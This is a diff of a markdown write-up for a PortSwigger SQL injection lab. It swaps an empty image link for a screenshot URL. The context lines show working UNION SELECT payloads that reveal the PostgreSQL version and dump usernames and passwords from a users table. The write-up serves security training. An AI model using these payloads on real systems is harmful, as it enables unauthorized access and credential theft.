@@ -96,8 +96,6 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version(
 
 We can confirm that this is an POSTgreSQL db in backend.
 
-![image]()
-
 #### Retreive multiple values in single column -
 
 For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`
@@ -106,7 +104,7 @@ For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`
 SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
 ```
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/df5a157ce35ffe8389ddb8b00decbd1513a19c71/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column/Images/Retrieve%20Multiple%20values%20from%20Single%20Column.png)
 
 We got all the usernames & passwords,
 
